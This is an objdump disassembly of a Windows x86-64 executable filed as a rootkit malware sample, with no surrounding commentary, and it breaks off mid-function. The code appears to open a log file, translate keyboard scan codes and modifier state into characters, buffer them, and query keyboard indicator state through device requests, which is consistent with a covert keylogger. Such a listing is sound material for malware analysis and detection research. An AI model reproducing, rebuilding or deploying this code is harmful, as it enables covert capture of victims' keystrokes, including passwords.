
malware_samples/rootkit/4e6b9a6d0870e85cbb957fc5e33503841f79f48e9f701f6e3d62a00dd8c82388.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	4c 8b dc             	mov    %rsp,%r11
   140001003:	53                   	push   %rbx
   140001004:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   14000100b:	33 c0                	xor    %eax,%eax
   14000100d:	33 db                	xor    %ebx,%ebx
   14000100f:	48 8d 15 da 41 00 00 	lea    0x41da(%rip),%rdx        # 0x1400051f0
   140001016:	89 5c 24 60          	mov    %ebx,0x60(%rsp)
   14000101a:	89 44 24 64          	mov    %eax,0x64(%rsp)
   14000101e:	49 8d 4b b8          	lea    -0x48(%r11),%rcx
   140001022:	49 89 43 b0          	mov    %rax,-0x50(%r11)
   140001026:	41 89 5b c8          	mov    %ebx,-0x38(%r11)
   14000102a:	49 89 43 d0          	mov    %rax,-0x30(%r11)
   14000102e:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   140001032:	49 89 43 e0          	mov    %rax,-0x20(%r11)
   140001036:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   14000103a:	49 89 43 f0          	mov    %rax,-0x10(%r11)
   14000103e:	ff 15 bc 3f 00 00    	call   *0x3fbc(%rip)        # 0x140005000
   140001044:	89 5c 24 50          	mov    %ebx,0x50(%rsp)
   140001048:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   14000104d:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   140001054:	00 
   140001055:	c7 44 24 38 03 00 00 	movl   $0x3,0x38(%rsp)
   14000105c:	00 
   14000105d:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140001062:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   140001069:	00 
   14000106a:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   14000106f:	4c 8d 84 24 80 00 00 	lea    0x80(%rsp),%r8
   140001076:	00 
   140001077:	48 8d 0d d2 64 00 00 	lea    0x64d2(%rip),%rcx        # 0x140007550
   14000107e:	ba 00 00 00 c0       	mov    $0xc0000000,%edx
   140001083:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   14000108a:	00 
   14000108b:	c7 84 24 80 00 00 00 	movl   $0x30,0x80(%rsp)
   140001092:	30 00 00 00 
   140001096:	48 89 9c 24 88 00 00 	mov    %rbx,0x88(%rsp)
   14000109d:	00 
   14000109e:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400010a3:	c7 84 24 98 00 00 00 	movl   $0x40,0x98(%rsp)
   1400010aa:	40 00 00 00 
   1400010ae:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   1400010b5:	00 
   1400010b6:	48 89 9c 24 a0 00 00 	mov    %rbx,0xa0(%rsp)
   1400010bd:	00 
   1400010be:	48 89 9c 24 a8 00 00 	mov    %rbx,0xa8(%rsp)
   1400010c5:	00 
   1400010c6:	ff 15 44 3f 00 00    	call   *0x3f44(%rip)        # 0x140005010
   1400010cc:	8b d8                	mov    %eax,%ebx
   1400010ce:	85 c0                	test   %eax,%eax
   1400010d0:	78 0e                	js     0x1400010e0
   1400010d2:	48 8d 0d 67 41 00 00 	lea    0x4167(%rip),%rcx        # 0x140005240
   1400010d9:	e8 e6 39 00 00       	call   0x140004ac4
   1400010de:	8b c3                	mov    %ebx,%eax
   1400010e0:	48 81 c4 b0 00 00 00 	add    $0xb0,%rsp
   1400010e7:	5b                   	pop    %rbx
   1400010e8:	c3                   	ret
   1400010e9:	cc                   	int3
   1400010ea:	cc                   	int3
   1400010eb:	cc                   	int3
   1400010ec:	cc                   	int3
   1400010ed:	cc                   	int3
   1400010ee:	cc                   	int3
   1400010ef:	cc                   	int3
   1400010f0:	4c 8b dc             	mov    %rsp,%r11
   1400010f3:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   1400010f7:	49 89 73 18          	mov    %rsi,0x18(%r11)
   1400010fb:	57                   	push   %rdi
   1400010fc:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140001103:	48 8b d9             	mov    %rcx,%rbx
   140001106:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000110a:	33 c0                	xor    %eax,%eax
   14000110c:	33 f6                	xor    %esi,%esi
   14000110e:	48 8d 3d 3b 54 00 00 	lea    0x543b(%rip),%rdi        # 0x140006550
   140001115:	89 44 24 64          	mov    %eax,0x64(%rsp)
   140001119:	f2 ae                	repnz scas (%rdi),%al
   14000111b:	48 8b fb             	mov    %rbx,%rdi
   14000111e:	89 74 24 60          	mov    %esi,0x60(%rsp)
   140001122:	48 f7 d1             	not    %rcx
   140001125:	41 89 73 10          	mov    %esi,0x10(%r11)
   140001129:	41 89 43 14          	mov    %eax,0x14(%r11)
   14000112d:	48 8d 51 ff          	lea    -0x1(%rcx),%rdx
   140001131:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   140001135:	49 89 43 e0          	mov    %rax,-0x20(%r11)
   140001139:	f2 ae                	repnz scas (%rdi),%al
   14000113b:	48 f7 d1             	not    %rcx
   14000113e:	48 ff c9             	dec    %rcx
   140001141:	03 d1                	add    %ecx,%edx
   140001143:	81 fa ff 0f 00 00    	cmp    $0xfff,%edx
   140001149:	7e 36                	jle    0x140001181
   14000114b:	48 8d 0d fe 53 00 00 	lea    0x53fe(%rip),%rcx        # 0x140006550
   140001152:	33 d2                	xor    %edx,%edx
   140001154:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   14000115a:	e8 d1 3c 00 00       	call   0x140004e30
   14000115f:	33 c0                	xor    %eax,%eax
   140001161:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   140001165:	48 8d 3d e4 53 00 00 	lea    0x53e4(%rip),%rdi        # 0x140006550
   14000116c:	f2 ae                	repnz scas (%rdi),%al
   14000116e:	33 c9                	xor    %ecx,%ecx
   140001170:	0f b6 04 0b          	movzbl (%rbx,%rcx,1),%eax
   140001174:	48 ff c1             	inc    %rcx
   140001177:	88 44 0f fe          	mov    %al,-0x2(%rdi,%rcx,1)
   14000117b:	84 c0                	test   %al,%al
   14000117d:	75 f1                	jne    0x140001170
   14000117f:	eb 1e                	jmp    0x14000119f
   140001181:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   140001185:	48 8d 3d c4 53 00 00 	lea    0x53c4(%rip),%rdi        # 0x140006550
   14000118c:	f2 ae                	repnz scas (%rdi),%al
   14000118e:	33 c9                	xor    %ecx,%ecx
   140001190:	0f b6 04 0b          	movzbl (%rbx,%rcx,1),%eax
   140001194:	48 ff c1             	inc    %rcx
   140001197:	88 44 0f fe          	mov    %al,-0x2(%rdi,%rcx,1)
   14000119b:	84 c0                	test   %al,%al
   14000119d:	75 f1                	jne    0x140001190
   14000119f:	48 8d 15 aa 53 00 00 	lea    0x53aa(%rip),%rdx        # 0x140006550
   1400011a6:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400011ab:	ff 15 6f 3e 00 00    	call   *0x3e6f(%rip)        # 0x140005020
   1400011b1:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400011b6:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400011bb:	41 b0 01             	mov    $0x1,%r8b
   1400011be:	ff 15 64 3e 00 00    	call   *0x3e64(%rip)        # 0x140005028
   1400011c4:	85 c0                	test   %eax,%eax
   1400011c6:	0f 85 c6 00 00 00    	jne    0x140001292
   1400011cc:	48 8b 0d 7d 63 00 00 	mov    0x637d(%rip),%rcx        # 0x140007550
   1400011d3:	48 85 c9             	test   %rcx,%rcx
   1400011d6:	74 41                	je     0x140001219
   1400011d8:	0f b7 44 24 50       	movzwl 0x50(%rsp),%eax
   1400011dd:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   1400011e2:	48 8d 94 24 98 00 00 	lea    0x98(%rsp),%rdx
   1400011e9:	00 
   1400011ea:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   1400011ef:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400011f3:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   1400011f8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400011fd:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140001202:	45 33 c9             	xor    %r9d,%r9d
   140001205:	45 33 c0             	xor    %r8d,%r8d
   140001208:	33 d2                	xor    %edx,%edx
   14000120a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000120f:	ff 15 1b 3e 00 00    	call   *0x3e1b(%rip)        # 0x140005030
   140001215:	85 c0                	test   %eax,%eax
   140001217:	79 58                	jns    0x140001271
   140001219:	48 8d 0d 30 63 00 00 	lea    0x6330(%rip),%rcx        # 0x140007550
   140001220:	e8 db fd ff ff       	call   0x140001000
   140001225:	85 c0                	test   %eax,%eax
   140001227:	78 5c                	js     0x140001285
   140001229:	0f b7 44 24 50       	movzwl 0x50(%rsp),%eax
   14000122e:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140001233:	48 8d 8c 24 98 00 00 	lea    0x98(%rsp),%rcx
   14000123a:	00 
   14000123b:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140001240:	48 8b 0d 09 63 00 00 	mov    0x6309(%rip),%rcx        # 0x140007550
   140001247:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000124b:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140001250:	45 33 c9             	xor    %r9d,%r9d
   140001253:	45 33 c0             	xor    %r8d,%r8d
   140001256:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000125b:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140001260:	33 d2                	xor    %edx,%edx
   140001262:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001267:	ff 15 c3 3d 00 00    	call   *0x3dc3(%rip)        # 0x140005030
   14000126d:	85 c0                	test   %eax,%eax
   14000126f:	78 14                	js     0x140001285
   140001271:	48 8d 0d d8 52 00 00 	lea    0x52d8(%rip),%rcx        # 0x140006550
   140001278:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   14000127e:	33 d2                	xor    %edx,%edx
   140001280:	e8 ab 3b 00 00       	call   0x140004e30
   140001285:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000128a:	ff 15 a8 3d 00 00    	call   *0x3da8(%rip)        # 0x140005038
   140001290:	33 c0                	xor    %eax,%eax
   140001292:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   140001299:	00 
   14000129a:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000129e:	49 8b 73 20          	mov    0x20(%r11),%rsi
   1400012a2:	49 8b e3             	mov    %r11,%rsp
   1400012a5:	5f                   	pop    %rdi
   1400012a6:	c3                   	ret
   1400012a7:	cc                   	int3
   1400012a8:	cc                   	int3
   1400012a9:	cc                   	int3
   1400012aa:	cc                   	int3
   1400012ab:	cc                   	int3
   1400012ac:	cc                   	int3
   1400012ad:	cc                   	int3
   1400012ae:	cc                   	int3
   1400012af:	cc                   	int3
   1400012b0:	48 83 ec 38          	sub    $0x38,%rsp
   1400012b4:	0f b7 c1             	movzwl %cx,%eax
   1400012b7:	33 c9                	xor    %ecx,%ecx
   1400012b9:	c6 44 24 20 00       	movb   $0x0,0x20(%rsp)
   1400012be:	48 89 4c 24 21       	mov    %rcx,0x21(%rsp)
   1400012c3:	89 4c 24 29          	mov    %ecx,0x29(%rsp)
   1400012c7:	84 c0                	test   %al,%al
   1400012c9:	0f 88 10 02 00 00    	js     0x1400014df
   1400012cf:	0f b7 c8             	movzwl %ax,%ecx
   1400012d2:	83 f9 1d             	cmp    $0x1d,%ecx
   1400012d5:	0f 84 97 01 00 00    	je     0x140001472
   1400012db:	83 f9 2a             	cmp    $0x2a,%ecx
   1400012de:	0f 84 7f 01 00 00    	je     0x140001463
   1400012e4:	83 f9 36             	cmp    $0x36,%ecx
   1400012e7:	0f 84 76 01 00 00    	je     0x140001463
   1400012ed:	83 f9 38             	cmp    $0x38,%ecx
   1400012f0:	0f 84 5e 01 00 00    	je     0x140001454
   1400012f6:	83 f9 3a             	cmp    $0x3a,%ecx
   1400012f9:	0f 84 e0 01 00 00    	je     0x1400014df
   1400012ff:	66 85 d2             	test   %dx,%dx
   140001302:	74 0a                	je     0x14000130e
   140001304:	66 83 fa 02          	cmp    $0x2,%dx
   140001308:	0f 85 d1 01 00 00    	jne    0x1400014df
   14000130e:	66 83 f8 45          	cmp    $0x45,%ax
   140001312:	75 54                	jne    0x140001368
   140001314:	80 3d 11 52 00 00 00 	cmpb   $0x0,0x5211(%rip)        # 0x14000652c
   14000131b:	74 23                	je     0x140001340
   14000131d:	48 8d 15 5c 3f 00 00 	lea    0x3f5c(%rip),%rdx        # 0x140005280
   140001324:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001329:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000132f:	e8 ac 37 00 00       	call   0x140004ae0
   140001334:	c6 05 f1 51 00 00 00 	movb   $0x0,0x51f1(%rip)        # 0x14000652c
   14000133b:	e9 fa 00 00 00       	jmp    0x14000143a
   140001340:	66 85 d2             	test   %dx,%dx
   140001343:	0f 85 f1 00 00 00    	jne    0x14000143a
   140001349:	38 15 bd 4c 00 00    	cmp    %dl,0x4cbd(%rip)        # 0x14000600c
   14000134f:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140001355:	48 8d 15 34 3f 00 00 	lea    0x3f34(%rip),%rdx        # 0x140005290
   14000135c:	0f 94 05 a9 4c 00 00 	sete   0x4ca9(%rip)        # 0x14000600c
   140001363:	e9 c8 00 00 00       	jmp    0x140001430
   140001368:	45 33 c0             	xor    %r8d,%r8d
   14000136b:	66 83 f8 37          	cmp    $0x37,%ax
   14000136f:	75 19                	jne    0x14000138a
   140001371:	66 85 d2             	test   %dx,%dx
   140001374:	75 2b                	jne    0x1400013a1
   140001376:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000137b:	c6 44 24 20 2a       	movb   $0x2a,0x20(%rsp)
   140001380:	e8 6b fd ff ff       	call   0x1400010f0
   140001385:	48 83 c4 38          	add    $0x38,%rsp
   140001389:	c3                   	ret
   14000138a:	66 83 f8 53          	cmp    $0x53,%ax
   14000138e:	77 11                	ja     0x1400013a1
   140001390:	66 83 f8 47          	cmp    $0x47,%ax
   140001394:	72 0b                	jb     0x1400013a1
   140001396:	66 85 d2             	test   %dx,%dx
   140001399:	74 2e                	je     0x1400013c9
   14000139b:	66 83 fa 01          	cmp    $0x1,%dx
   14000139f:	74 28                	je     0x1400013c9
   1400013a1:	41 8b d0             	mov    %r8d,%edx
   1400013a4:	48 8d 0d c5 4d 00 00 	lea    0x4dc5(%rip),%rcx        # 0x140006170
   1400013ab:	4c 8d 0d 0a 4e 00 00 	lea    0x4e0a(%rip),%r9        # 0x1400061bc
   1400013b2:	66 39 01             	cmp    %ax,(%rcx)
   1400013b5:	74 0d                	je     0x1400013c4
   1400013b7:	48 83 c1 02          	add    $0x2,%rcx
   1400013bb:	ff c2                	inc    %edx
   1400013bd:	49 3b c9             	cmp    %r9,%rcx
   1400013c0:	7c f0                	jl     0x1400013b2
   1400013c2:	eb 05                	jmp    0x1400013c9
   1400013c4:	83 fa ff             	cmp    $0xffffffff,%edx
   1400013c7:	75 50                	jne    0x140001419
   1400013c9:	66 83 f8 54          	cmp    $0x54,%ax
   1400013cd:	73 6b                	jae    0x14000143a
   1400013cf:	44 38 05 32 4c 00 00 	cmp    %r8b,0x4c32(%rip)        # 0x140006008
   1400013d6:	75 11                	jne    0x1400013e9
   1400013d8:	44 38 05 2a 4c 00 00 	cmp    %r8b,0x4c2a(%rip)        # 0x140006009
   1400013df:	74 1e                	je     0x1400013ff
   1400013e1:	41 b8 54 00 00 00    	mov    $0x54,%r8d
   1400013e7:	eb 16                	jmp    0x1400013ff
   1400013e9:	80 3d 19 4c 00 00 00 	cmpb   $0x0,0x4c19(%rip)        # 0x140006009
   1400013f0:	b9 a8 00 00 00       	mov    $0xa8,%ecx
   1400013f5:	41 b8 fc 00 00 00    	mov    $0xfc,%r8d
   1400013fb:	44 0f 44 c1          	cmove  %ecx,%r8d
   1400013ff:	0f b7 c0             	movzwl %ax,%eax
   140001402:	49 63 c8             	movslq %r8d,%rcx
   140001405:	48 03 c8             	add    %rax,%rcx
   140001408:	48 8d 05 01 4c 00 00 	lea    0x4c01(%rip),%rax        # 0x140006010
   14000140f:	0f b6 04 01          	movzbl (%rcx,%rax,1),%eax
   140001413:	88 44 24 20          	mov    %al,0x20(%rsp)
   140001417:	eb 21                	jmp    0x14000143a
   140001419:	48 63 d2             	movslq %edx,%rdx
   14000141c:	48 8d 05 9d 4d 00 00 	lea    0x4d9d(%rip),%rax        # 0x1400061c0
   140001423:	41 b8 0d 00 00 00    	mov    $0xd,%r8d
   140001429:	48 6b d2 0d          	imul   $0xd,%rdx,%rdx
   14000142d:	48 03 d0             	add    %rax,%rdx
   140001430:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001435:	e8 a6 36 00 00       	call   0x140004ae0
   14000143a:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   14000143f:	0f 84 9a 00 00 00    	je     0x1400014df
   140001445:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000144a:	e8 a1 fc ff ff       	call   0x1400010f0
   14000144f:	48 83 c4 38          	add    $0x38,%rsp
   140001453:	c3                   	ret
   140001454:	66 85 d2             	test   %dx,%dx
   140001457:	0f 94 05 ad 4b 00 00 	sete   0x4bad(%rip)        # 0x14000600b
   14000145e:	48 83 c4 38          	add    $0x38,%rsp
   140001462:	c3                   	ret
   140001463:	66 85 d2             	test   %dx,%dx
   140001466:	0f 94 05 9b 4b 00 00 	sete   0x4b9b(%rip)        # 0x140006008
   14000146d:	48 83 c4 38          	add    $0x38,%rsp
   140001471:	c3                   	ret
   140001472:	66 83 fa 01          	cmp    $0x1,%dx
   140001476:	75 09                	jne    0x140001481
   140001478:	48 8d 15 e1 3d 00 00 	lea    0x3de1(%rip),%rdx        # 0x140005260
   14000147f:	eb 0d                	jmp    0x14000148e
   140001481:	66 83 fa 02          	cmp    $0x2,%dx
   140001485:	75 34                	jne    0x1400014bb
   140001487:	48 8d 15 e2 3d 00 00 	lea    0x3de2(%rip),%rdx        # 0x140005270
   14000148e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001493:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140001499:	e8 42 36 00 00       	call   0x140004ae0
   14000149e:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   1400014a3:	74 0a                	je     0x1400014af
   1400014a5:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400014aa:	e8 41 fc ff ff       	call   0x1400010f0
   1400014af:	c6 05 54 4b 00 00 01 	movb   $0x1,0x4b54(%rip)        # 0x14000600a
   1400014b6:	48 83 c4 38          	add    $0x38,%rsp
   1400014ba:	c3                   	ret
   1400014bb:	66 85 d2             	test   %dx,%dx
   1400014be:	74 18                	je     0x1400014d8
   1400014c0:	66 83 fa 03          	cmp    $0x3,%dx
   1400014c4:	74 12                	je     0x1400014d8
   1400014c6:	66 83 fa 04          	cmp    $0x4,%dx
   1400014ca:	75 13                	jne    0x1400014df
   1400014cc:	c6 05 59 50 00 00 01 	movb   $0x1,0x5059(%rip)        # 0x14000652c
   1400014d3:	48 83 c4 38          	add    $0x38,%rsp
   1400014d7:	c3                   	ret
   1400014d8:	c6 05 2b 4b 00 00 00 	movb   $0x0,0x4b2b(%rip)        # 0x14000600a
   1400014df:	48 83 c4 38          	add    $0x38,%rsp
   1400014e3:	c3                   	ret
   1400014e4:	cc                   	int3
   1400014e5:	cc                   	int3
   1400014e6:	cc                   	int3
   1400014e7:	cc                   	int3
   1400014e8:	cc                   	int3
   1400014e9:	cc                   	int3
   1400014ea:	cc                   	int3
   1400014eb:	cc                   	int3
   1400014ec:	cc                   	int3
   1400014ed:	cc                   	int3
   1400014ee:	cc                   	int3
   1400014ef:	cc                   	int3
   1400014f0:	40 53                	rex push %rbx
   1400014f2:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   1400014f9:	48 8b d9             	mov    %rcx,%rbx
   1400014fc:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001501:	45 33 c0             	xor    %r8d,%r8d
   140001504:	33 d2                	xor    %edx,%edx
   140001506:	ff 15 34 3b 00 00    	call   *0x3b34(%rip)        # 0x140005040
   14000150c:	48 85 db             	test   %rbx,%rbx
   14000150f:	75 0e                	jne    0x14000151f
   140001511:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140001516:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   14000151d:	5b                   	pop    %rbx
   14000151e:	c3                   	ret
   14000151f:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140001524:	45 33 c9             	xor    %r9d,%r9d
   140001527:	45 33 c0             	xor    %r8d,%r8d
   14000152a:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000152f:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140001534:	48 8b d3             	mov    %rbx,%rdx
   140001537:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000153c:	48 8d 84 24 90 00 00 	lea    0x90(%rsp),%rax
   140001543:	00 
   140001544:	c6 44 24 30 01       	movb   $0x1,0x30(%rsp)
   140001549:	b9 40 00 0b 00       	mov    $0xb0040,%ecx
   14000154e:	c7 44 24 28 1c 00 00 	movl   $0x1c,0x28(%rsp)
   140001555:	00 
   140001556:	48 89 bc 24 98 00 00 	mov    %rdi,0x98(%rsp)
   14000155d:	00 
   14000155e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001563:	ff 15 df 3a 00 00    	call   *0x3adf(%rip)        # 0x140005048
   140001569:	48 8b cb             	mov    %rbx,%rcx
   14000156c:	48 8b d0             	mov    %rax,%rdx
   14000156f:	48 8b f8             	mov    %rax,%rdi
   140001572:	ff 15 d8 3a 00 00    	call   *0x3ad8(%rip)        # 0x140005050
   140001578:	3d 03 01 00 00       	cmp    $0x103,%eax
   14000157d:	75 1e                	jne    0x14000159d
   14000157f:	45 33 c9             	xor    %r9d,%r9d
   140001582:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001587:	45 33 c0             	xor    %r8d,%r8d
   14000158a:	41 8d 51 05          	lea    0x5(%r9),%edx
   14000158e:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001595:	00 00 
   140001597:	ff 15 bb 3a 00 00    	call   *0x3abb(%rip)        # 0x140005058
   14000159d:	8b 47 30             	mov    0x30(%rdi),%eax
   1400015a0:	48 8b bc 24 98 00 00 	mov    0x98(%rsp),%rdi
   1400015a7:	00 
   1400015a8:	85 c0                	test   %eax,%eax
   1400015aa:	78 1d                	js     0x1400015c9
   1400015ac:	0f b7 94 24 92 00 00 	movzwl 0x92(%rsp),%edx
   1400015b3:	00 
   1400015b4:	0f b6 ca             	movzbl %dl,%ecx
   1400015b7:	80 e1 04             	and    $0x4,%cl
   1400015ba:	80 e2 02             	and    $0x2,%dl
   1400015bd:	88 15 49 4a 00 00    	mov    %dl,0x4a49(%rip)        # 0x14000600c
   1400015c3:	88 0d 40 4a 00 00    	mov    %cl,0x4a40(%rip)        # 0x140006009
   1400015c9:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   1400015d0:	5b                   	pop    %rbx
   1400015d1:	c3                   	ret
   1400015d2:	cc                   	int3
   1400015d3:	cc                   	int3
   1400015d4:	cc                   	int3
   1400015d5:	cc                   	int3
   1400015d6:	cc                   	int3
   1400015d7:	cc                   	int3
   1400015d8:	cc                   	int3
   1400015d9:	cc                   	int3
   1400015da:	cc                   	int3
   1400015db:	cc                   	int3
   1400015dc:	cc                   	int3
   1400015dd:	cc                   	int3
   1400015de:	cc                   	int3
   1400015df:	cc                   	int3
   1400015e0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400015e5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400015ea:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400015ef:	41 54                	push   %r12
   1400015f1:	41 55                	push   %r13
   1400015f3:	41 56                	push   %r14
   1400015f5:	48 83 ec 20          	sub    $0x20,%rsp
   1400015f9:	8b 72 30             	mov    0x30(%rdx),%esi
   1400015fc:	45 33 f6             	xor    %r14d,%r14d
   1400015ff:	49 8b f8             	mov    %r8,%rdi
   140001602:	4c 8b e2             	mov    %rdx,%r12
   140001605:	4c 8b e9             	mov    %rcx,%r13
   140001608:	41 83 f8 02          	cmp    $0x2,%r8d
   14000160c:	75 19                	jne    0x140001627
   14000160e:	48 8d 15 0b 4f 00 00 	lea    0x4f0b(%rip),%rdx        # 0x140006520
   140001615:	48 8d 0d f4 4e 00 00 	lea    0x4ef4(%rip),%rcx        # 0x140006510
   14000161c:	ff 15 3e 3a 00 00    	call   *0x3a3e(%rip)        # 0x140005060
   140001622:	48 8b d8             	mov    %rax,%rbx
   140001625:	eb 22                	jmp    0x140001649
   140001627:	41 83 f8 01          	cmp    $0x1,%r8d
   14000162b:	75 19                	jne    0x140001646
   14000162d:	48 8d 15 c4 4d 00 00 	lea    0x4dc4(%rip),%rdx        # 0x1400063f8
   140001634:	48 8d 0d c5 4e 00 00 	lea    0x4ec5(%rip),%rcx        # 0x140006500
   14000163b:	ff 15 1f 3a 00 00    	call   *0x3a1f(%rip)        # 0x140005060
   140001641:	48 8b d8             	mov    %rax,%rbx
   140001644:	eb 03                	jmp    0x140001649
   140001646:	49 8b de             	mov    %r14,%rbx
   140001649:	48 8b cb             	mov    %rbx,%rcx
   14000164c:	ff 15 16 3a 00 00    	call   *0x3a16(%rip)        # 0x140005068
   140001652:	84 c0                	test   %al,%al
   140001654:	0f 84 58 02 00 00    	je     0x1400018b2
   14000165a:	48 85 db             	test   %rbx,%rbx
   14000165d:	0f 84 4f 02 00 00    	je     0x1400018b2
   140001663:	85 f6                	test   %esi,%esi
   140001665:	0f 88 cf 01 00 00    	js     0x14000183a
   14000166b:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140001670:	49 8b 6c 24 18       	mov    0x18(%r12),%rbp
   140001675:	48 8b cd             	mov    %rbp,%rcx
   140001678:	ff 15 ea 39 00 00    	call   *0x39ea(%rip)        # 0x140005068
   14000167e:	84 c0                	test   %al,%al
   140001680:	0f 84 af 01 00 00    	je     0x140001835
   140001686:	83 ff 02             	cmp    $0x2,%edi
   140001689:	0f 85 d9 00 00 00    	jne    0x140001768
   14000168f:	48 b8 ab aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaab,%rax
   140001696:	aa aa aa 
   140001699:	49 f7 64 24 38       	mulq   0x38(%r12)
   14000169e:	48 c1 ea 03          	shr    $0x3,%rdx
   1400016a2:	85 d2                	test   %edx,%edx
   1400016a4:	0f 84 8b 01 00 00    	je     0x140001835
   1400016aa:	8b fa                	mov    %edx,%edi
   1400016ac:	0f 1f 40 00          	nopl   0x0(%rax)
   1400016b0:	ff 05 5e 4d 00 00    	incl   0x4d5e(%rip)        # 0x140006414
   1400016b6:	48 8d 0d 43 4d 00 00 	lea    0x4d43(%rip),%rcx        # 0x140006400
   1400016bd:	ff 15 ad 39 00 00    	call   *0x39ad(%rip)        # 0x140005070
   1400016c3:	48 8b d0             	mov    %rax,%rdx
   1400016c6:	48 85 c0             	test   %rax,%rax
   1400016c9:	75 27                	jne    0x1400016f2
   1400016cb:	8b 15 5b 4d 00 00    	mov    0x4d5b(%rip),%edx        # 0x14000642c
   1400016d1:	44 8b 05 50 4d 00 00 	mov    0x4d50(%rip),%r8d        # 0x140006428
   1400016d8:	8b 0d 46 4d 00 00    	mov    0x4d46(%rip),%ecx        # 0x140006424
   1400016de:	ff 05 34 4d 00 00    	incl   0x4d34(%rip)        # 0x140006418
   1400016e4:	ff 15 46 4d 00 00    	call   *0x4d46(%rip)        # 0x140006430
   1400016ea:	48 8b d0             	mov    %rax,%rdx
   1400016ed:	48 85 c0             	test   %rax,%rax
   1400016f0:	74 67                	je     0x140001759
   1400016f2:	c7 42 10 02 00 00 00 	movl   $0x2,0x10(%rdx)
   1400016f9:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1400016fd:	48 89 42 18          	mov    %rax,0x18(%rdx)
   140001701:	8b 45 00             	mov    0x0(%rbp),%eax
   140001704:	89 42 20             	mov    %eax,0x20(%rdx)
   140001707:	8b 45 04             	mov    0x4(%rbp),%eax
   14000170a:	89 42 24             	mov    %eax,0x24(%rdx)
   14000170d:	8b 45 08             	mov    0x8(%rbp),%eax
   140001710:	89 42 28             	mov    %eax,0x28(%rdx)
   140001713:	44 38 35 eb 48 00 00 	cmp    %r14b,0x48eb(%rip)        # 0x140006005
   14000171a:	74 13                	je     0x14000172f
   14000171c:	66 83 7a 24 01       	cmpw   $0x1,0x24(%rdx)
   140001721:	75 0c                	jne    0x14000172f
   140001723:	66 44 89 72 24       	mov    %r14w,0x24(%rdx)
   140001728:	44 88 35 d6 48 00 00 	mov    %r14b,0x48d6(%rip)        # 0x140006005
   14000172f:	4c 8d 05 9a 4c 00 00 	lea    0x4c9a(%rip),%r8        # 0x1400063d0
   140001736:	48 8d 0d 83 4c 00 00 	lea    0x4c83(%rip),%rcx        # 0x1400063c0
   14000173d:	ff 15 35 39 00 00    	call   *0x3935(%rip)        # 0x140005078
   140001743:	45 33 c9             	xor    %r9d,%r9d
   140001746:	48 8d 0d 8b 4c 00 00 	lea    0x4c8b(%rip),%rcx        # 0x1400063d8
   14000174d:	45 8d 41 01          	lea    0x1(%r9),%r8d
